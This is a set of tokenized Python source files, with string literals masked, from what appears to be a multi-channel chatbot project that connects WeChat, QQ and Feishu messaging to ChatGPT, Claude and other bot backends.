<EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def send_video ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if fileDir or file_ : <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> file_ , fileDir = fileDir , None <EOL> if fileDir is None : <EOL> fileDir = '<STR_LIT>' <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , isVideo = True , file_ = file_ ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : mediaId , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def send ( self , msg , toUserName = None , mediaId = None ) : <EOL> if not msg : <EOL> r = ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = self . send_file ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = self . send_file ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = self . send_image ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = self . send_image ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> r = self . send_msg ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> elif msg [ : <NUM_LIT> ] == '<STR_LIT>' : <EOL> if mediaId is None : <EOL> r = self . send_video ( msg [ <NUM_LIT> : ] , toUserName ) <EOL> else : <EOL> r = self . send_video ( msg [ <NUM_LIT> : ] , toUserName , mediaId ) <EOL> else : <EOL> r = self . send_msg ( msg , toUserName ) <EOL> return r <EOL> def revoke ( self , msgId , toUserName , localId = None ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : localId or str ( time . time ( ) * <NUM_LIT> ) , <EOL> "<STR_LIT>" : msgId , <EOL> "<STR_LIT>" : toUserName } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> </s>
<s> def create_bot ( bot_type ) : <EOL> if bot_type == '<STR_LIT>' : <EOL> from bot . baidu . baidu_unit_bot import BaiduUnitBot <EOL> return BaiduUnitBot ( ) <EOL> elif bot_type == '<STR_LIT>' : <EOL> from bot . chatgpt . chat_gpt_bot import ChatGPTBot <EOL> return ChatGPTBot ( ) <EOL> elif bot_type == '<STR_LIT>' : <EOL> from bot . openai . open_ai_bot import OpenAIBot <EOL> return OpenAIBot ( ) <EOL> elif bot_type == '<STR_LIT>' : <EOL> from bot . claude . claude_ai_bot import ClaudeAiBot <EOL> return ClaudeAiBot ( ) <EOL> raise RuntimeError <EOL> </s>
<s> from lib import itchat <EOL> from lib . itchat . content import * <EOL> import json <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> from common . log import logger <EOL> from config import conf <EOL> import requests <EOL> import io <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ itchat . msg_register ( TEXT ) <EOL> def handler_single_msg ( msg ) : <EOL> WechatChannel ( ) . handle ( msg ) <EOL> return None <EOL> @ itchat . msg_register ( TEXT , isGroupChat = True ) <EOL> def handler_group_msg ( msg ) : <EOL> WechatChannel ( ) . handle_group ( msg ) <EOL> return None <EOL> class WechatChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def startup ( self ) : <EOL> itchat . auto_login ( enableCmdQR = <NUM_LIT> ) <EOL> itchat . run ( ) <EOL> def handle ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + json . dumps ( msg , ensure_ascii = False ) ) <EOL> from_user_id = msg [ '<STR_LIT>' ] <EOL> to_user_id = msg [ '<STR_LIT>' ] <EOL> other_user_id = msg [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> content = msg [ '<STR_LIT>' ] <EOL> match_prefix = self . check_prefix ( content , conf ( ) . get ( '<STR_LIT>' ) ) <EOL> if from_user_id == other_user_id and match_prefix is not None : <EOL> if match_prefix != '<STR_LIT>' : <EOL> str_list = content . split ( match_prefix , <NUM_LIT> ) <EOL> if len ( str_list ) == <NUM_LIT> : <EOL> content = str_list [ <NUM_LIT> ] . strip ( ) <EOL> img_match_prefix = self . check_prefix ( content , conf ( ) . get ( '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> content = content . split ( img_match_prefix , <NUM_LIT> ) [ <NUM_LIT> ] . strip ( ) <EOL> thread_pool . submit ( self . _do_send_img , content , from_user_id ) <EOL> else : <EOL> thread_pool . submit ( self . _do_send , content , from_user_id ) <EOL> elif to_user_id == other_user_id and match_prefix : <EOL> str_list = content . split ( match_prefix , <NUM_LIT> ) <EOL> if len ( str_list ) == <NUM_LIT> : <EOL> content = str_list [ <NUM_LIT> ] . strip ( ) <EOL> img_match_prefix = self . check_prefix ( content , conf ( ) . get ( '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> content = content . split ( img_match_prefix , <NUM_LIT> ) [ <NUM_LIT> ] . strip ( ) <EOL> thread_pool . submit ( self . _do_send_img , content , to_user_id ) <EOL> else : <EOL> thread_pool . submit ( self . _do_send , content , to_user_id ) <EOL> def handle_group ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + json . dumps ( msg , ensure_ascii = False ) ) <EOL> group_name = msg [ '<STR_LIT>' ] . get ( '<STR_LIT>' , None ) <EOL> group_id = msg [ '<STR_LIT>' ] . get ( '<STR_LIT>' , None ) <EOL> if not group_name : <EOL> return "<STR_LIT>" <EOL> origin_content = msg [ '<STR_LIT>' ] <EOL> content = msg [ '<STR_LIT>' ] <EOL> content_list = content . split ( '<STR_LIT>' , <NUM_LIT> ) <EOL> context_special_list = content . split ( '<STR_LIT>' , <NUM_LIT> ) <EOL> if len ( context_special_list ) == <NUM_LIT> : <EOL> content = context_special_list [ <NUM_LIT> ] <EOL> elif len ( content_list ) == <NUM_LIT> : <EOL> content = content_list [ <NUM_LIT> ] <EOL> config = conf ( ) <EOL> match_prefix = ( msg [ '<STR_LIT>' ] and not config . get ( "<STR_LIT>" , False ) ) or self . check_prefix ( origin_content , config . get ( '<STR_LIT>' ) ) or self . check_contain ( origin_content , config . get ( '<STR_LIT>' ) ) <EOL> if ( '<STR_LIT>' in config . get ( '<STR_LIT>' ) or group_name in config . get ( '<STR_LIT>' ) or self . check_contain ( group_name , config . get ( '<STR_LIT>' ) ) ) and match_prefix : <EOL> img_match_prefix = self . check_prefix ( content , conf ( ) . get ( '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> content = content . split ( img_match_prefix , <NUM_LIT> ) [ <NUM_LIT> ] . strip ( ) <EOL> thread_pool . submit ( self . _do_send_img , content , group_id ) <EOL> else : <EOL> thread_pool . submit ( self . _do_send_group , content , msg ) <EOL> def send ( self , msg , receiver ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg , receiver ) ) <EOL> itchat . send ( msg , toUserName = receiver ) <EOL> def _do_send ( self , query , reply_user_id ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = reply_user_id <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> if reply_text : <EOL> self . send ( conf ( ) . get ( "<STR_LIT>" ) + reply_text , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def _do_send_img ( self , query , reply_user_id ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> img_url = super ( ) . build_reply_content ( query , context ) <EOL> if not img_url : <EOL> return <EOL> pic_res = requests . get ( img_url , stream = True ) <EOL> image_storage = io . BytesIO ( ) <EOL> for block in pic_res . iter_content ( <NUM_LIT> ) : <EOL> image_storage . write ( block ) <EOL> image_storage . seek ( <NUM_LIT> ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_user_id ) ) <EOL> itchat . send_image ( image_storage , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def _do_send_group ( self , query , msg ) : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = msg [ '<STR_LIT>' ] <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> if reply_text : <EOL> reply_text = '<STR_LIT>' + msg [ '<STR_LIT>' ] + '<STR_LIT>' + reply_text . strip ( ) <EOL> self . send ( conf ( ) . get ( "<STR_LIT>" , "<STR_LIT>" ) + reply_text , msg [ '<STR_LIT>' ] [ '<STR_LIT>' ] ) <EOL> def check_prefix ( self , content , prefix_list ) : <EOL> for prefix in prefix_list : <EOL> if content . startswith ( prefix ) : <EOL> return prefix <EOL> return None <EOL> def check_contain ( self , content , keyword_list ) : <EOL> if not keyword_list : <EOL> return None <EOL> for ky in keyword_list : <EOL> if content . find ( ky ) != - <NUM_LIT> : <EOL> return True <EOL> return None <EOL> </s>
<s> import config <EOL> from common . log import logger <EOL> from channel import channel_factory <EOL> def run ( ) : <EOL> try : <EOL> config . load_config ( ) <EOL> channel = channel_factory . create_channel ( "<STR_LIT>" ) <EOL> channel . startup ( ) <EOL> except Exception as e : <EOL> logger . error ( "<STR_LIT>" ) <EOL> logger . exception ( e ) <EOL> if __name__ == "<STR_LIT>" : <EOL> run ( ) <EOL> </s>
<s> import pickle , os <EOL> import logging <EOL> import requests <EOL> from . . config import VERSION <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage import templates <EOL> from . contact import update_local_chatrooms , update_local_friends <EOL> from . messages import produce_msg <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_hotreload ( core ) : <EOL> core . dump_login_status = dump_login_status <EOL> core . load_login_status = load_login_status <EOL> async def dump_login_status ( self , fileDir = None ) : <EOL> fileDir = fileDir or self . hotReloadDir <EOL> try : <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> f . write ( '<STR_LIT>' ) <EOL> os . remove ( fileDir ) <EOL> except : <EOL> raise Exception ( '<STR_LIT>' ) <EOL> status = { <EOL> '<STR_LIT>' : VERSION , <EOL> '<STR_LIT>' : self . loginInfo , <EOL> '<STR_LIT>' : self . s . cookies . get_dict ( ) , <EOL> '<STR_LIT>' : self . storageClass . dumps ( ) } <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> pickle . dump ( status , f ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> async def load_login_status ( self , fileDir , <EOL> loginCallback = None , exitCallback = None ) : <EOL> try : <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> j = pickle . load ( f ) <EOL> except Exception as e : <EOL> logger . debug ( '<STR_LIT>' ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if j . get ( '<STR_LIT>' , '<STR_LIT>' ) != VERSION : <EOL> logger . debug ( ( '<STR_LIT>' + <EOL> '<STR_LIT>' ) % ( <EOL> j . get ( '<STR_LIT>' , '<STR_LIT>' ) , VERSION ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> self . loginInfo = j [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = templates . User ( self . loginInfo [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] . core = self <EOL> self . s . cookies = requests . utils . cookiejar_from_dict ( j [ '<STR_LIT>' ] ) <EOL> self . storageClass . loads ( j [ '<STR_LIT>' ] ) <EOL> try : <EOL> msgList , contactList = self . get_msg ( ) <EOL> except : <EOL> msgList = contactList = None <EOL> if ( msgList or contactList ) is None : <EOL> self . logout ( ) <EOL> await load_last_login_status ( self . s , j [ '<STR_LIT>' ] ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> else : <EOL> if contactList : <EOL> for contact in contactList : <EOL> if '<STR_LIT>' in contact [ '<STR_LIT>' ] : <EOL> update_local_chatrooms ( self , [ contact ] ) <EOL> else : <EOL> update_local_friends ( self , [ contact ] ) <EOL> if msgList : <EOL> msgList = produce_msg ( self , msgList ) <EOL> for msg in msgList : self . msgList . put ( msg ) <EOL> await self . start_receiving ( exitCallback ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> if hasattr ( loginCallback , '<STR_LIT>' ) : <EOL> await loginCallback ( self . storageClass . userName ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> async def load_last_login_status ( session , cookiesDict ) : <EOL> try : <EOL> session . cookies = requests . utils . cookiejar_from_dict ( { <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] + '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } ) <EOL> except : <EOL> logger . info ( '<STR_LIT>' ) <EOL> logger . info ( '<STR_LIT>' ) <EOL> </s>
<s> import pickle <EOL> class idStore ( ) : <EOL> def __init__ ( self ) : <EOL> self . id = None <EOL> def get_id ( self ) : <EOL> if self . id is None : <EOL> try : <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' ) as f : <EOL> self . id = pickle . load ( f ) <EOL> except FileNotFoundError : <EOL> print ( "<STR_LIT>" ) <EOL> return self . id <EOL> def set_id ( self , id ) : <EOL> self . id = id <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' ) as f : <EOL> pickle . dump ( self . id , f ) <EOL> </s>
<s> import werobot <EOL> import time <EOL> from config import conf <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from bridge . bridge import Bridge <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> import config <EOL> import os <EOL> config . load_config ( ) <EOL> robot = werobot . WeRoBot ( token = conf ( ) . get ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> cache = { } <EOL> @ robot . text <EOL> def hello_world ( msg ) : <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' , encoding = '<STR_LIT>' ) as f : <EOL> sensitive_words = [ line . strip ( ) for line in f . readlines ( ) ] <EOL> found = False <EOL> for word in sensitive_words : <EOL> if word != '<STR_LIT>' and word in msg . content : <EOL> found = True <EOL> break <EOL> if found : <EOL> return "<STR_LIT>" <EOL> else : <EOL> logger . info ( '<STR_LIT>' . format ( msg . content , msg . source ) ) <EOL> key = msg . content + '<STR_LIT>' + msg . source <EOL> if cache . get ( key ) : <EOL> cache . get ( key ) [ '<STR_LIT>' ] += <NUM_LIT> <EOL> return WechatSubsribeAccount ( ) . handle ( msg ) <EOL> class WechatSubsribeAccount ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . host = conf ( ) . get ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) <EOL> self . port = conf ( ) . get ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) <EOL> logger . info ( "<STR_LIT>" . format ( <EOL> self . host , self . port ) ) <EOL> def startup ( self ) : <EOL> logger . info ( '<STR_LIT>' ) <EOL> robot . config [ '<STR_LIT>' ] = self . host <EOL> robot . config [ '<STR_LIT>' ] = self . port <EOL> robot . run ( ) <EOL> def handle ( self , msg , count = <NUM_LIT> ) : <EOL> if msg . content == "<STR_LIT>" : <EOL> return self . get_un_send_content ( msg . source ) <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = msg . source <EOL> key = msg . content + '<STR_LIT>' + msg . source <EOL> res = cache . get ( key ) <EOL> if not res : <EOL> cache [ key ] = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } <EOL> thread_pool . submit ( self . _do_send , msg . content , context ) <EOL> res = cache . get ( key ) <EOL> logger . info ( "<STR_LIT>" . format ( count , res ) ) <EOL> if res . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> res [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> cache . pop ( key ) <EOL> return res . get ( "<STR_LIT>" ) <EOL> if cache . get ( key ) [ '<STR_LIT>' ] == <NUM_LIT> and count >= <NUM_LIT> : <EOL> logger . info ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> if count <= <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> if count == <NUM_LIT> : <EOL> return None <EOL> return self . handle ( msg , count + <NUM_LIT> ) <EOL> def _do_send ( self , query , context ) : <EOL> key = query + '<STR_LIT>' + context [ '<STR_LIT>' ] <EOL> reply_text = self . build_reply_content ( query , context ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_text ) ) <EOL> cache [ key ] [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> cache [ key ] [ '<STR_LIT>' ] = reply_text <EOL> def get_un_send_content ( self , from_user_id ) : <EOL> for key in cache : <EOL> if from_user_id in key : <EOL> value = cache [ key ] <EOL> if value . get ( '<STR_LIT>' ) == "<STR_LIT>" : <EOL> cache . pop ( key ) <EOL> return value . get ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> return "<STR_LIT>" <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> </s>
<s> import logging , traceback , sys , threading <EOL> try : <EOL> import Queue <EOL> except ImportError : <EOL> import queue as Queue <EOL> from . . log import set_logging <EOL> from . . utils import test_connect <EOL> from . . storage import templates <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_register ( core ) : <EOL> core . auto_login = auto_login <EOL> core . configured_reply = configured_reply <EOL> core . msg_register = msg_register <EOL> core . run = run <EOL> async def auto_login ( self , EventScanPayload = None , ScanStatus = None , event_stream = None , <EOL> hotReload = True , statusStorageDir = '<STR_LIT>' , <EOL> enableCmdQR = False , picDir = None , qrCallback = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> if not test_connect ( ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> sys . exit ( ) <EOL> self . useHotReload = hotReload <EOL> self . hotReloadDir = statusStorageDir <EOL> if hotReload : <EOL> if await self . load_login_status ( statusStorageDir , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) : <EOL> return <EOL> await self . login ( enableCmdQR = enableCmdQR , picDir = picDir , qrCallback = qrCallback , EventScanPayload = EventScanPayload , ScanStatus = ScanStatus , event_stream = event_stream , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) <EOL> await self . dump_login_status ( statusStorageDir ) <EOL> else : <EOL> await self . login ( enableCmdQR = enableCmdQR , picDir = picDir , qrCallback = qrCallback , EventScanPayload = EventScanPayload , ScanStatus = ScanStatus , event_stream = event_stream , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) <EOL> async def configured_reply ( self , event_stream , payload , message_container ) : <EOL> try : <EOL> msg = self . msgList . get ( timeout = <NUM_LIT> ) <EOL> if '<STR_LIT>' in msg . keys ( ) : <EOL> message_container [ msg [ '<STR_LIT>' ] ] = msg <EOL> except Queue . Empty : <EOL> pass <EOL> else : <EOL> if isinstance ( msg [ '<STR_LIT>' ] , templates . User ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> elif isinstance ( msg [ '<STR_LIT>' ] , templates . MassivePlatform ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> elif isinstance ( msg [ '<STR_LIT>' ] , templates . Chatroom ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> if replyFn is None : <EOL> r = None <EOL> else : <EOL> try : <EOL> r = await replyFn ( msg ) <EOL> if r is not None : <EOL> await self . send ( r , msg . get ( '<STR_LIT>' ) ) <EOL> except : <EOL> logger . warning ( traceback . format_exc ( ) ) <EOL> def msg_register ( self , msgType , isFriendChat = False , isGroupChat = False , isMpChat = False ) : <EOL> if not ( isinstance ( msgType , list ) or isinstance ( msgType , tuple ) ) : <EOL> msgType = [ msgType ] <EOL> def _msg_register ( fn ) : <EOL> for _msgType in msgType : <EOL> if isFriendChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if isGroupChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if isMpChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if not any ( ( isFriendChat , isGroupChat , isMpChat ) ) : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> return fn <EOL> return _msg_register <EOL> async def run ( self , debug = False , blockThread = True ) : <EOL> logger . info ( '<STR_LIT>' ) <EOL> if debug : <EOL> set_logging ( loggingLevel = logging . DEBUG ) <EOL> async def reply_fn ( ) : <EOL> try : <EOL> while self . alive : <EOL> await self . configured_reply ( ) <EOL> except KeyboardInterrupt : <EOL> if self . useHotReload : <EOL> await self . dump_login_status ( ) <EOL> self . alive = False <EOL> logger . debug ( '<STR_LIT>' ) <EOL> logger . info ( '<STR_LIT>' ) <EOL> if blockThread : <EOL> await reply_fn ( ) <EOL> else : <EOL> replyThread = threading . Thread ( target = reply_fn ) <EOL> replyThread . setDaemon ( True ) <EOL> replyThread . start ( ) <EOL> </s>
<s> from aiocqhttp import CQHttp , Event , MessageSegment <EOL> from channel . channel import Channel <EOL> from common . log import logger <EOL> from config import conf <EOL> from bridge . bridge import Bridge <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> bot = CQHttp ( ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ bot . on_message ( '<STR_LIT>' ) <EOL> async def _ ( event : Event ) : <EOL> logger . info ( "<STR_LIT>" , event ) <EOL> QqchaChannel ( ) . handle ( event ) <EOL> @ bot . on_startup <EOL> async def startup ( ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> class QqchaChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . host = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . port = conf ( ) . get ( '<STR_LIT>' ) <EOL> logger . info ( "<STR_LIT>" . format ( <EOL> self . host , self . port ) ) <EOL> def startup ( self ) : <EOL> bot . run ( host = self . host , port = self . port ) <EOL> def handle ( self , msg ) : <EOL> thread_pool . submit ( self . _do_handle , msg ) <EOL> def _do_handle ( self , msg ) : <EOL> context = dict ( ) <EOL> reply_text = self . build_reply_content ( msg . message , context ) <EOL> bot . sync . send_private_msg ( user_id = msg . user_id , message = reply_text ) <EOL> def send ( self , msg , receiver ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg , receiver ) ) <EOL> bot . send ( receiver , msg ) <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> </s>
<s> import json <EOL> import hmac <EOL> import hashlib <EOL> import base64 <EOL> import time <EOL> import requests <EOL> from urllib . parse import quote_plus <EOL> from common . log import logger <EOL> from flask import Flask , request , render_template , make_response <EOL> from config import conf <EOL> from bridge . bridge import Bridge <EOL> from channel . channel import Channel <EOL> from urllib import request as url_request <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> class FeiShuChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . app_id = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . app_secret = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . verification_token = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . host = conf ( ) . get ( '<STR_LIT>' ) <EOL> self . port = conf ( ) . get ( '<STR_LIT>' ) <EOL> logger . info ( "<STR_LIT>" . format ( <EOL> self . app_id , self . app_secret , self . verification_token , self . host , self . port ) ) <EOL> def startup ( self ) : <EOL> http_app . run ( host = self . host , port = self . port ) <EOL> def get_tenant_access_token ( self ) : <EOL> url = "<STR_LIT>" <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> req_body = { <EOL> "<STR_LIT>" : self . app_id , <EOL> "<STR_LIT>" : self . app_secret <EOL> } <EOL> data = bytes ( json . dumps ( req_body ) , encoding = '<STR_LIT>' ) <EOL> req = url_request . Request ( url = url , data = data , <EOL> headers = headers , method = '<STR_LIT>' ) <EOL> try : <EOL> response = url_request . urlopen ( req ) <EOL> except Exception as e : <EOL> print ( e . read ( ) . decode ( ) ) <EOL> return "<STR_LIT>" <EOL> rsp_body = response . read ( ) . decode ( '<STR_LIT>' ) <EOL> rsp_dict = json . loads ( rsp_body ) <EOL> code = rsp_dict . get ( "<STR_LIT>" , - <NUM_LIT> ) <EOL> if code != <NUM_LIT> : <EOL> print ( "<STR_LIT>" , code ) <EOL> return "<STR_LIT>" <EOL> return rsp_dict . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> def notify_feishu ( self , token , receive_type , receive_id , at_id , answer ) : <EOL> url = "<STR_LIT>" <EOL> params = { "<STR_LIT>" : receive_type } <EOL> text = answer . lstrip ( ) <EOL> msgContent = { <EOL> "<STR_LIT>" : text , <EOL> } <EOL> req = { <EOL> "<STR_LIT>" : receive_id , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( msgContent ) , <EOL> } <EOL> payload = json . dumps ( req ) <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" + token , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> response = requests . request ( <EOL> "<STR_LIT>" , url , params = params , headers = headers , data = payload <EOL> ) <EOL> def handle ( self , message ) : <EOL> event = message [ "<STR_LIT>" ] <EOL> msg = event [ "<STR_LIT>" ] <EOL> messageId = msg [ "<STR_LIT>" ] <EOL> chat_type = msg [ "<STR_LIT>" ] <EOL> sender_id = event [ "<STR_LIT>" ] [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> prompt = json . loads ( msg [ "<STR_LIT>" ] ) [ "<STR_LIT>" ] <EOL> prompt = prompt . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> message_type = msg [ "<STR_LIT>" ] <EOL> if message_type != "<STR_LIT>" : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> if chat_type == "<STR_LIT>" : <EOL> mentions = msg [ "<STR_LIT>" ] <EOL> if not mentions : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> receive_type = "<STR_LIT>" <EOL> receive_id = msg . get ( "<STR_LIT>" ) <EOL> at_id = sender_id <EOL> elif chat_type == "<STR_LIT>" : <EOL> receive_type = "<STR_LIT>" <EOL> receive_id = sender_id <EOL> at_id = None <EOL> access_token = self . get_tenant_access_token ( ) <EOL> if access_token == "<STR_LIT>" : <EOL> logger . error ( "<STR_LIT>" ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = str ( sender_id ) <EOL> reply = self . build_reply_content ( prompt , context ) <EOL> self . notify_feishu ( access_token , receive_type , <EOL> receive_id , at_id , reply ) 